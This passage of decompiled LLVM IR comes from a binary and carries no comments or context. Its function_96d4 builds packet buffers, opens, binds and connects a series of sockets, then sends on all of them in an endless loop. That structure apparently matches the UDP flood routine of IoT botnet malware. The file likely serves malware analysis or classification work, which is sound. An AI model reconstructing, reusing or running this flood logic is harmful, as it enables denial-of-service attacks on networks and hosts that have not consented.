  %v0_9524 = load i32, i32* %r2.global-to-local, align 4
  %v1_9524 = trunc i32 %v0_9524 to i8
  %v2_9524 = load i32, i32* %r4.global-to-local, align 4
  %v3_9524 = inttoptr i32 %v2_9524 to i8*
  store i8 %v1_9524, i8* %v3_9524, align 1
  %v2_9528 = call i32* @calloc(i32 %v1_9514, i32 %v0_9518)
  %v4_9528 = ptrtoint i32* %v2_9528 to i32
  %v2_952c = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_952c = zext i8 %v2_952c to i32
  store i32 ptrtoint (i32* @global_var_c6b8.95 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_9528, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_953c = mul nuw nsw i32 %v3_952c, 4
  store i32 %v3_953c, i32* %r1.global-to-local, align 4
  %v2_9540 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_c6b8.95 to i32), i32* %v2_9528, align 4
  %v0_9548 = load i32, i32* %r3.global-to-local, align 4
  %v1_9548 = trunc i32 %v0_9548 to i8
  %v2_9548 = load i32, i32* %r5.global-to-local, align 4
  %v3_9548 = add i32 %v2_9548, 4
  %v4_9548 = inttoptr i32 %v3_9548 to i8*
  store i8 %v1_9548, i8* %v4_9548, align 1
  %v0_954c = load i32, i32* %r1.global-to-local, align 4
  %v1_954c = add i32 %v0_954c, 4
  store i32 %v1_954c, i32* %r1.global-to-local, align 4
  %v4_9550 = inttoptr i32 %v2_9540 to i32*
  %v5_9550 = call i32* @realloc(i32* %v4_9550, i32 %v1_954c)
  %v7_9550 = ptrtoint i32* %v5_9550 to i32
  %v2_9554 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9554 = zext i8 %v2_9554 to i32
  store i32 %v3_9554, i32* %r3.global-to-local, align 4
  store i32 %v7_9550, i32* %ip.global-to-local, align 4
  %v0_955c = load i32, i32* %r5.global-to-local, align 4
  %v5_955c = mul nuw nsw i32 %v3_9554, 4
  %v6_955c = add i32 %v5_955c, %v7_9550
  %v7_955c = inttoptr i32 %v6_955c to i32*
  store i32 %v0_955c, i32* %v7_955c, align 4
  %v0_9560 = load i32, i32* %r3.global-to-local, align 4
  %v1_9560 = load i32, i32* %r8.global-to-local, align 4
  %v2_9560 = add i32 %v1_9560, %v0_9560
  store i32 %v2_9560, i32* %r2.global-to-local, align 4
  %v0_9564 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9564, i32* %r1.global-to-local, align 4
  %v0_956c = load i32, i32* %ip.global-to-local, align 4
  %v1_956c = load i32, i32* %r6.global-to-local, align 4
  %v2_956c = inttoptr i32 %v1_956c to i32*
  store i32 %v0_956c, i32* %v2_956c, align 4
  %v0_9570 = load i32, i32* %r2.global-to-local, align 4
  %v1_9570 = trunc i32 %v0_9570 to i8
  %v2_9570 = load i32, i32* %r4.global-to-local, align 4
  %v3_9570 = inttoptr i32 %v2_9570 to i8*
  store i8 %v1_9570, i8* %v3_9570, align 1
  %v2_9574 = call i32* @calloc(i32 %v1_9560, i32 %v0_9564)
  %v4_9574 = ptrtoint i32* %v2_9574 to i32
  %v2_9578 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9578 = zext i8 %v2_9578 to i32
  store i32 48700, i32* %r2.global-to-local, align 4
  store i32 %v4_9574, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_9588 = mul nuw nsw i32 %v3_9578, 4
  store i32 %v3_9588, i32* %r1.global-to-local, align 4
  %v2_958c = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 48700, i32* %v2_9574, align 4
  %v0_9594 = load i32, i32* %r3.global-to-local, align 4
  %v1_9594 = trunc i32 %v0_9594 to i8
  %v2_9594 = load i32, i32* %r5.global-to-local, align 4
  %v3_9594 = add i32 %v2_9594, 4
  %v4_9594 = inttoptr i32 %v3_9594 to i8*
  store i8 %v1_9594, i8* %v4_9594, align 1
  %v0_9598 = load i32, i32* %r1.global-to-local, align 4
  %v1_9598 = add i32 %v0_9598, 4
  store i32 %v1_9598, i32* %r1.global-to-local, align 4
  %v4_959c = inttoptr i32 %v2_958c to i32*
  %v5_959c = call i32* @realloc(i32* %v4_959c, i32 %v1_9598)
  %v7_959c = ptrtoint i32* %v5_959c to i32
  %v2_95a0 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r3.global-to-local, align 4
  store i32 %v7_959c, i32* %ip.global-to-local, align 4
  %v0_95a8 = load i32, i32* %r5.global-to-local, align 4
  %v5_95a8 = mul nuw nsw i32 %v3_95a0, 4
  %v6_95a8 = add i32 %v5_95a8, %v7_959c
  %v7_95a8 = inttoptr i32 %v6_95a8 to i32*
  store i32 %v0_95a8, i32* %v7_95a8, align 4
  %v0_95ac = load i32, i32* %r3.global-to-local, align 4
  %v1_95ac = load i32, i32* %r8.global-to-local, align 4
  %v2_95ac = add i32 %v1_95ac, %v0_95ac
  store i32 %v2_95ac, i32* %r2.global-to-local, align 4
  %v0_95b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_95b0, i32* %r1.global-to-local, align 4
  %v0_95b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_95b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_95b8 = inttoptr i32 %v1_95b8 to i32*
  store i32 %v0_95b8, i32* %v2_95b8, align 4
  %v0_95bc = load i32, i32* %r2.global-to-local, align 4
  %v1_95bc = trunc i32 %v0_95bc to i8
  %v2_95bc = load i32, i32* %r4.global-to-local, align 4
  %v3_95bc = inttoptr i32 %v2_95bc to i8*
  store i8 %v1_95bc, i8* %v3_95bc, align 1
  %v2_95c0 = call i32* @calloc(i32 %v1_95ac, i32 %v0_95b0)
  %v4_95c0 = ptrtoint i32* %v2_95c0 to i32
  %v2_95c4 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_95c4 = zext i8 %v2_95c4 to i32
  store i32 ptrtoint (i32* @global_var_aaac.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_95c0, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_95d4 = mul nuw nsw i32 %v3_95c4, 4
  store i32 %v3_95d4, i32* %r1.global-to-local, align 4
  %v2_95d8 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_aaac.98 to i32), i32* %v2_95c0, align 4
  %v0_95e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95e0 = trunc i32 %v0_95e0 to i8
  %v2_95e0 = load i32, i32* %r5.global-to-local, align 4
  %v3_95e0 = add i32 %v2_95e0, 4
  %v4_95e0 = inttoptr i32 %v3_95e0 to i8*
  store i8 %v1_95e0, i8* %v4_95e0, align 1
  %v0_95e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_95e4 = add i32 %v0_95e4, 4
  store i32 %v1_95e4, i32* %r1.global-to-local, align 4
  %v4_95e8 = inttoptr i32 %v2_95d8 to i32*
  %v5_95e8 = call i32* @realloc(i32* %v4_95e8, i32 %v1_95e4)
  %v7_95e8 = ptrtoint i32* %v5_95e8 to i32
  %v2_95ec = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_95ec = zext i8 %v2_95ec to i32
  store i32 %v3_95ec, i32* %r3.global-to-local, align 4
  store i32 %v7_95e8, i32* %ip.global-to-local, align 4
  %v0_95f4 = load i32, i32* %r5.global-to-local, align 4
  %v5_95f4 = mul nuw nsw i32 %v3_95ec, 4
  %v6_95f4 = add i32 %v5_95f4, %v7_95e8
  %v7_95f4 = inttoptr i32 %v6_95f4 to i32*
  store i32 %v0_95f4, i32* %v7_95f4, align 4
  %v0_95f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_95f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_95f8 = add i32 %v1_95f8, %v0_95f8
  store i32 %v2_95f8, i32* %r2.global-to-local, align 4
  %v0_95fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_95fc, i32* %r1.global-to-local, align 4
  %v0_9604 = load i32, i32* %ip.global-to-local, align 4
  %v1_9604 = load i32, i32* %r6.global-to-local, align 4
  %v2_9604 = inttoptr i32 %v1_9604 to i32*
  store i32 %v0_9604, i32* %v2_9604, align 4
  %v0_9608 = load i32, i32* %r2.global-to-local, align 4
  %v1_9608 = trunc i32 %v0_9608 to i8
  %v2_9608 = load i32, i32* %r4.global-to-local, align 4
  %v3_9608 = inttoptr i32 %v2_9608 to i8*
  store i8 %v1_9608, i8* %v3_9608, align 1
  %v2_960c = call i32* @calloc(i32 %v1_95f8, i32 %v0_95fc)
  %v4_960c = ptrtoint i32* %v2_960c to i32
  %v2_9610 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9610 = zext i8 %v2_9610 to i32
  store i32 ptrtoint (i32* @global_var_a330.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_960c, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_9620 = mul nuw nsw i32 %v3_9610, 4
  store i32 %v3_9620, i32* %r1.global-to-local, align 4
  %v2_9624 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_a330.100 to i32), i32* %v2_960c, align 4
  %v0_962c = load i32, i32* %r3.global-to-local, align 4
  %v1_962c = trunc i32 %v0_962c to i8
  %v2_962c = load i32, i32* %r5.global-to-local, align 4
  %v3_962c = add i32 %v2_962c, 4
  %v4_962c = inttoptr i32 %v3_962c to i8*
  store i8 %v1_962c, i8* %v4_962c, align 1
  %v0_9630 = load i32, i32* %r1.global-to-local, align 4
  %v1_9630 = add i32 %v0_9630, 4
  store i32 %v1_9630, i32* %r1.global-to-local, align 4
  %v4_9634 = inttoptr i32 %v2_9624 to i32*
  %v5_9634 = call i32* @realloc(i32* %v4_9634, i32 %v1_9630)
  %v7_9634 = ptrtoint i32* %v5_9634 to i32
  %v2_9638 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9638 = zext i8 %v2_9638 to i32
  store i32 %v3_9638, i32* %r3.global-to-local, align 4
  store i32 %v7_9634, i32* %ip.global-to-local, align 4
  %v0_9640 = load i32, i32* %r5.global-to-local, align 4
  %v5_9640 = mul nuw nsw i32 %v3_9638, 4
  %v6_9640 = add i32 %v5_9640, %v7_9634
  %v7_9640 = inttoptr i32 %v6_9640 to i32*
  store i32 %v0_9640, i32* %v7_9640, align 4
  %v0_9644 = load i32, i32* %r3.global-to-local, align 4
  %v1_9644 = load i32, i32* %r8.global-to-local, align 4
  %v2_9644 = add i32 %v1_9644, %v0_9644
  store i32 %v2_9644, i32* %r2.global-to-local, align 4
  %v0_9648 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9648, i32* %r1.global-to-local, align 4
  %v1_9650 = trunc i32 %v2_9644 to i8
  %v2_9650 = load i32, i32* %r4.global-to-local, align 4
  %v3_9650 = inttoptr i32 %v2_9650 to i8*
  store i8 %v1_9650, i8* %v3_9650, align 1
  %v0_9654 = load i32, i32* %ip.global-to-local, align 4
  %v1_9654 = load i32, i32* %r6.global-to-local, align 4
  %v2_9654 = inttoptr i32 %v1_9654 to i32*
  store i32 %v0_9654, i32* %v2_9654, align 4
  %v2_9658 = call i32* @calloc(i32 %v1_9644, i32 %v0_9648)
  %v4_9658 = ptrtoint i32* %v2_9658 to i32
  %v2_965c = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_965c = zext i8 %v2_965c to i32
  store i32 39356, i32* %r2.global-to-local, align 4
  store i32 %v4_9658, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_966c = mul nuw nsw i32 %v3_965c, 4
  store i32 %v3_966c, i32* %r1.global-to-local, align 4
  %v2_9670 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 39356, i32* %v2_9658, align 4
  %v0_9678 = load i32, i32* %r3.global-to-local, align 4
  %v1_9678 = trunc i32 %v0_9678 to i8
  %v2_9678 = load i32, i32* %r5.global-to-local, align 4
  %v3_9678 = add i32 %v2_9678, 4
  %v4_9678 = inttoptr i32 %v3_9678 to i8*
  store i8 %v1_9678, i8* %v4_9678, align 1
  %v0_967c = load i32, i32* %r1.global-to-local, align 4
  %v1_967c = add i32 %v0_967c, 4
  store i32 %v1_967c, i32* %r1.global-to-local, align 4
  %v4_9680 = inttoptr i32 %v2_9670 to i32*
  %v5_9680 = call i32* @realloc(i32* %v4_9680, i32 %v1_967c)
  %v6_9680 = ptrtoint i32* %v5_9680 to i32
  %v2_9684 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9684 = zext i8 %v2_9684 to i32
  store i32 %v3_9684, i32* %r3.global-to-local, align 4
  %v1_9688 = load i32, i32* %r6.global-to-local, align 4
  %v2_9688 = inttoptr i32 %v1_9688 to i32*
  store i32 %v6_9680, i32* %v2_9688, align 4
  %v0_968c = load i32, i32* %r5.global-to-local, align 4
  %v2_968c = load i32, i32* %r3.global-to-local, align 4
  %v5_968c = mul i32 %v2_968c, 4
  %v6_968c = add i32 %v5_968c, %v6_9680
  %v7_968c = inttoptr i32 %v6_968c to i32*
  store i32 %v0_968c, i32* %v7_968c, align 4
  %v0_9690 = load i32, i32* %r3.global-to-local, align 4
  %v1_9690 = load i32, i32* %r8.global-to-local, align 4
  %v2_9690 = add i32 %v1_9690, %v0_9690
  store i32 %v2_9690, i32* %r2.global-to-local, align 4
  %v1_9698 = trunc i32 %v2_9690 to i8
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = inttoptr i32 %v2_9698 to i8*
  store i8 %v1_9698, i8* %v3_9698, align 1
  %v2_969c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_969c, i32* @r4, align 4
  ret i32 %v1_9690

; uselistorder directives
  uselistorder i32 %v1_9690, { 1, 0 }
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder i32 %v1_95f8, { 1, 0 }
  uselistorder i32 %v1_95ac, { 1, 0 }
  uselistorder i32 %v1_9560, { 1, 0 }
  uselistorder i32 %v1_9514, { 1, 0 }
  uselistorder i32 %v1_94c8, { 1, 0 }
  uselistorder i32 %v1_947c, { 1, 0 }
  uselistorder i32 %v3_9424, { 1, 0, 2 }
  uselistorder i32 %v1_93e4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i8* bitcast (i8** @global_var_1a3c4.75 to i8*), { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1a3c4.75, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1a3c4.75 to i32), { 1, 0 }
}

define i32 @function_96d4(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96d4:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_96d4 = load i32, i32* @r4, align 4
  %v6_96d4 = load i32, i32* @r5, align 4
  %v24_96d4 = load i32, i32* @fp, align 4
  %v1_96d8 = urem i32 %arg1, 256
  store i32 %v1_96d8, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_96f0 = urem i32 %arg3, 256
  store i32 %v1_96f0, i32* @r4, align 4
  %v2_96f4 = call i32* @calloc(i32 %v1_96d8, i32 4)
  %v4_96f4 = ptrtoint i32* %v2_96f4 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_96f4, i32* @sl, align 4
  %v0_9700 = load i32, i32* @r7, align 4
  %v2_9704 = call i32* @calloc(i32 %v0_9700, i32 4)
  %v3_9704 = ptrtoint i32* %v2_9704 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r5, align 4
  %v0_9710 = load i32, i32* @r6, align 4
  store i32 %v0_9710, i32* %r1.global-to-local, align 4
  store i32 %v3_9704, i32* @sb, align 4
  %v0_9720 = load i32, i32* @r4, align 4
  %v4_9724 = inttoptr i32 %v0_9710 to i32*
  %v5_9724 = call i32 @function_92dc(i32 %v0_9720, i32* %v4_9724, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v3_972c = urem i32 %v5_9724, 65536
  %v0_9730 = load i32, i32* @r6, align 4
  store i32 %v0_9730, i32* %r1.global-to-local, align 4
  %v0_9738 = load i32, i32* @r5, align 4
  %v0_973c = load i32, i32* @r4, align 4
  %v5_9744 = inttoptr i32 %v0_9730 to i32*
  %v6_9744 = call i32 @function_92dc(i32 %v0_973c, i32* %v5_9744, i32 6, i32 %v0_9738)
  %v0_9748 = load i32, i32* @r6, align 4
  store i32 %v0_9748, i32* %r1.global-to-local, align 4
  %v3_974c = mul i32 %v6_9744, 65536
  store i32 %v3_974c, i32* %fp.global-to-local, align 4
  %v0_9758 = load i32, i32* @r4, align 4
  %v4_975c = inttoptr i32 %v0_9748 to i32*
  %v5_975c = call i32 @function_92dc(i32 %v0_9758, i32* %v4_975c, i32 0, i32 512)
  %v0_9768 = load i32, i32* @r6, align 4
  store i32 %v0_9768, i32* %r1.global-to-local, align 4
  %v0_976c = load i32, i32* @r4, align 4
  %v3_9774 = urem i32 %v5_975c, 65536
  store i32 %v3_9774, i32* @r6, align 4
  %v4_9778 = inttoptr i32 %v0_9768 to i32*
  %v5_9778 = call i32 @function_92dc(i32 %v0_976c, i32* %v4_9778, i32 1, i32 1)
  %v0_977c = load i32, i32* %fp.global-to-local, align 4
  %v3_977c = udiv i32 %v0_977c, 65536
  store i32 %v3_977c, i32* %r4.global-to-local, align 4
  %v1_9784 = load i32, i32* @r5, align 4
  %v9_9784 = icmp eq i32 %v3_977c, %v1_9784
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_9784, label %dec_label_pc_97ac, label %bb

bb:                                               ; preds = %dec_label_pc_96d4
  %v2_9798 = mul nuw nsw i32 %v3_977c, 256
  %v4_979c = and i32 %v2_9798, 65280
  %v1_97a0 = urem i32 %v5_9778, 256
  store i32 %v1_97a0, i32* @r8, align 4
  %v5_97a4 = udiv i32 %v0_977c, 16777216
  %v6_97a4 = or i32 %v4_979c, %v5_97a4
  br label %dec_label_pc_97b8

dec_label_pc_97ac:                                ; preds = %dec_label_pc_96d4
  %v1_97a07 = urem i32 %v5_9778, 256
  store i32 %v1_97a07, i32* @r8, align 4
  %v0_97ac = call i32 @function_f67c()
  %v3_97b4 = urem i32 %v0_97ac, 65536
  br label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %bb, %dec_label_pc_97ac
  %storemerge17 = phi i32 [ %v6_97a4, %bb ], [ %v3_97b4, %dec_label_pc_97ac ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_97b8 = load i32, i32* @r7, align 4
  %tmp42 = icmp slt i32 %v0_97b8, 1
  br i1 %tmp42, label %dec_label_pc_9964.preheader.thread, label %dec_label_pc_97c0

dec_label_pc_9964.preheader.thread:               ; preds = %dec_label_pc_97b8
  br label %dec_label_pc_992c

dec_label_pc_9964.preheader:                      ; preds = %dec_label_pc_98c0
  %tmp444749 = icmp slt i32 %v1_9814, 1
  br i1 %tmp444749, label %dec_label_pc_992c, label %dec_label_pc_9930.lr.ph

dec_label_pc_97c0:                                ; preds = %dec_label_pc_97b8
  store i32 %v3_972c, i32* %r1.global-to-local, align 4
  %v3_97c4 = udiv i32 %v5_9724, 256
  %v5_97d0 = trunc i32 %v3_97c4 to i8
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_97e8 = udiv i32 %v5_9724, 65536
  %v4_97f8 = trunc i32 %v3_97e8 to i8
  store i8 %v4_97f8, i8* %stack_var_-80, align 1
  %v9_990c = icmp eq i32 %v3_972c, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_9830 = ptrtoint i32* %stack_var_-52 to i32
  %tmp43 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_98f0

dec_label_pc_9800:                                ; preds = %dec_label_pc_98f0
  %v2_9800 = load i8, i8* %stack_var_-80, align 1
  %v3_9800 = sext i8 %v2_9800 to i32
  store i32 %v3_9800, i32* %r1.global-to-local, align 4
  %v2_9804 = load i32, i32* %r5.global-to-local, align 4
  %v3_9804 = add i32 %v2_9804, 2
  %v4_9804 = inttoptr i32 %v3_9804 to i8*
  store i8 %v5_97d0, i8* %v4_9804, align 1
  %v0_9808 = load i32, i32* %r1.global-to-local, align 4
  %v1_9808 = trunc i32 %v0_9808 to i8
  %v2_9808 = load i32, i32* %r5.global-to-local, align 4
  %v3_9808 = add i32 %v2_9808, 3
  %v4_9808 = inttoptr i32 %v3_9808 to i8*
  store i8 %v1_9808, i8* %v4_9808, align 1
  br label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_9918, %dec_label_pc_9800
  %v1_9814 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9824 = call i32 @socket(i32 2, i32 17, i32 17)
  %v7_982c = icmp eq i32 %v3_9824, -1
  store i32 %v2_9830, i32* %r1.global-to-local, align 4
  %v2_983c = load i32, i32* @sb, align 4
  %v3_983c = add i32 %v2_983c, %stack_var_-60.0
  %v4_983c = inttoptr i32 %v3_983c to i32*
  store i32 %v3_9824, i32* %v4_983c, align 4
  br i1 %v7_982c, label %dec_label_pc_9970, label %dec_label_pc_9844

dec_label_pc_9844:                                ; preds = %dec_label_pc_980c
  store i32 2, i32* %stack_var_-52, align 4
  %v5_9864 = call i32 @bind(i32 %v3_9824, %sockaddr* %tmp43, i32 16)
  %v0_9868 = load i32, i32* %r5.global-to-local, align 4
  %v1_9868 = add i32 %v0_9868, 20
  %v2_9868 = inttoptr i32 %v1_9868 to i8*
  %v3_9868 = load i8, i8* %v2_9868, align 1
  %tmp53 = icmp ugt i8 %v3_9868, 31
  br i1 %tmp53, label %dec_label_pc_98c0, label %dec_label_pc_9874

dec_label_pc_9874:                                ; preds = %dec_label_pc_9844
  %v1_9874 = add i32 %v0_9868, 16
  %v2_9874 = inttoptr i32 %v1_9874 to i32*
  %v3_9874 = load i32, i32* %v2_9874, align 4
  store i32 %v3_9874, i32* %r4.global-to-local, align 4
  %v0_9878 = call i32 @function_f67c()
  %v1_9880 = and i32 %v3_9874, 65280
  %v3_9888 = mul i32 %v3_9874, 16777216
  %v4_988c = mul nuw nsw i32 %v1_9880, 256
  %v5_988c = or i32 %v4_988c, %v3_9888
  store i32 %v5_988c, i32* %r1.global-to-local, align 4
  %v0_9894 = load i32, i32* %r5.global-to-local, align 4
  %v1_9894 = add i32 %v0_9894, 20
  %v2_9894 = inttoptr i32 %v1_9894 to i8*
  %v3_9894 = load i8, i8* %v2_9894, align 1
  %v4_9894 = zext i8 %v3_9894 to i32
  %v2_9898 = call i32 @llvm.bswap.i32(i32 %v3_9874)
  %v7_989c = lshr i32 %v0_9878, %v4_9894
  %v8_989c = add i32 %v7_989c, %v2_9898
  %v3_98a8 = mul i32 %v8_989c, 16777216
  %v1_98ac = and i32 %v8_989c, 65280
  %v4_98b0 = mul nuw nsw i32 %v1_98ac, 256
  %v5_98b0 = or i32 %v4_98b0, %v3_98a8
  store i32 %v5_98b0, i32* %r1.global-to-local, align 4
  %v2_98b8 = call i32 @llvm.bswap.i32(i32 %v8_989c)
  %v2_98bc = add i32 %v0_9894, 4
  %v3_98bc = inttoptr i32 %v2_98bc to i32*
  store i32 %v2_98b8, i32* %v3_98bc, align 4
  %v0_98cc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_98c0

dec_label_pc_98c0:                                ; preds = %dec_label_pc_9844, %dec_label_pc_9874
  %v0_98cc = phi i32 [ %v0_9868, %dec_label_pc_9844 ], [ %v0_98cc.pre, %dec_label_pc_9874 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_98c8 = load i32, i32* @sb, align 4
  %v2_98c8 = add i32 %v1_98c8, %stack_var_-60.0
  %v3_98c8 = inttoptr i32 %v2_98c8 to i32*
  %v4_98c8 = load i32, i32* %v3_98c8, align 4
  %v1_98cc = inttoptr i32 %v0_98cc to %sockaddr*
  store i32 %v0_98cc, i32* %r1.global-to-local, align 4
  %v5_98d0 = call i32 @connect(i32 %v4_98c8, %sockaddr* %v1_98cc, i32 16)
  %v1_98dc = add i32 %stack_var_-60.0, 4
  %v1_98e0 = load i32, i32* @r7, align 4
  %v9_98e0 = icmp eq i32 %v1_9814, %v1_98e0
  %v0_98e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_98e8 = add i32 %v0_98e8, 24
  store i32 %v1_98e8, i32* %r5.global-to-local, align 4
  br i1 %v9_98e0, label %dec_label_pc_9964.preheader, label %dec_label_pc_98f0

dec_label_pc_98f0:                                ; preds = %dec_label_pc_98c0, %dec_label_pc_97c0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_97c0 ], [ %v1_98dc, %dec_label_pc_98c0 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_97c0 ], [ %v1_9814, %dec_label_pc_98c0 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_98fc = call i32* @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32 1)
  %v3_98fc = ptrtoint i32* %v2_98fc to i32
  store i32 %v3_972c, i32* %r1.global-to-local, align 4
  %v2_9910 = load i32, i32* @sl, align 4
  %v3_9910 = add i32 %v2_9910, %stack_var_-60.0
  %v4_9910 = inttoptr i32 %v3_9910 to i32*
  store i32 %v3_98fc, i32* %v4_9910, align 4
  br i1 %v9_990c, label %dec_label_pc_9918, label %dec_label_pc_9800

dec_label_pc_9918:                                ; preds = %dec_label_pc_98f0
  %v0_9918 = call i32 @function_f67c()
  %v1_9918 = trunc i32 %v0_9918 to i8
  %v4_991c = sdiv i32 %v0_9918, 256
  %v1_9920 = trunc i32 %v4_991c to i8
  %v2_9920 = load i32, i32* %r5.global-to-local, align 4
  %v3_9920 = add i32 %v2_9920, 3
  %v4_9920 = inttoptr i32 %v3_9920 to i8*
  store i8 %v1_9920, i8* %v4_9920, align 1
  %v3_9924 = load i32, i32* %r5.global-to-local, align 4
  %v4_9924 = add i32 %v3_9924, 2
  %v5_9924 = inttoptr i32 %v4_9924 to i8*
  store i8 %v1_9918, i8* %v5_9924, align 1
  br label %dec_label_pc_980c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9964.loopexit, %dec_label_pc_9964.preheader.thread, %dec_label_pc_9964.preheader, %dec_label_pc_9968.loopexit, %dec_label_pc_992c
  br label %dec_label_pc_992c

dec_label_pc_9930:                                ; preds = %dec_label_pc_9930.lr.ph, %dec_label_pc_9968.loopexit
  %v0_9930 = load i32, i32* @r8, align 4
  %v2_9930 = icmp eq i32 %v0_9930, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_9930, label %dec_label_pc_9938, label %dec_label_pc_9978

dec_label_pc_9938:                                ; preds = %dec_label_pc_9930
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9940

dec_label_pc_9940:                                ; preds = %dec_label_pc_9940, %dec_label_pc_9938
  %v0_9948 = phi i32 [ %v1_9948, %dec_label_pc_9940 ], [ 0, %dec_label_pc_9938 ]
  %v0_9940 = phi i32 [ %v1_995c, %dec_label_pc_9940 ], [ 0, %dec_label_pc_9938 ]
  %v1_9940 = load i32, i32* @sb, align 4
  %v2_9940 = add i32 %v1_9940, %v0_9940
  %v3_9940 = inttoptr i32 %v2_9940 to i32*
  %v4_9940 = load i32, i32* %v3_9940, align 4
  %v1_9944 = load i32, i32* @sl, align 4
  %v2_9944 = add i32 %v1_9944, %v0_9940
  %v3_9944 = inttoptr i32 %v2_9944 to i32*
  %v4_9944 = load i32, i32* %v3_9944, align 4
  store i32 %v4_9944, i32* %r1.global-to-local, align 4
  %v1_9948 = add i32 %v0_9948, 1
  store i32 %v1_9948, i32* %r5.global-to-local, align 4
  %v0_994c = load i32, i32* @r6, align 4
  %v4_9954 = inttoptr i32 %v4_9944 to i32*
  %v5_9954 = call i32 @send(i32 %v4_9940, i32* %v4_9954, i32 %v0_994c, i32 16384)
  %v1_9958 = load i32, i32* @r7, align 4
  %v9_9958 = icmp eq i32 %v1_9948, %v1_9958
  %v0_995c = load i32, i32* %r4.global-to-local, align 4
  %v1_995c = add i32 %v0_995c, 4
  store i32 %v1_995c, i32* %r4.global-to-local, align 4
  br i1 %v9_9958, label %dec_label_pc_9964.loopexit, label %dec_label_pc_9940

dec_label_pc_9964.loopexit:                       ; preds = %dec_label_pc_9940
  %tmp4447 = icmp slt i32 %v1_9948, 1
  br i1 %tmp4447, label %dec_label_pc_992c, label %dec_label_pc_9930.lr.ph

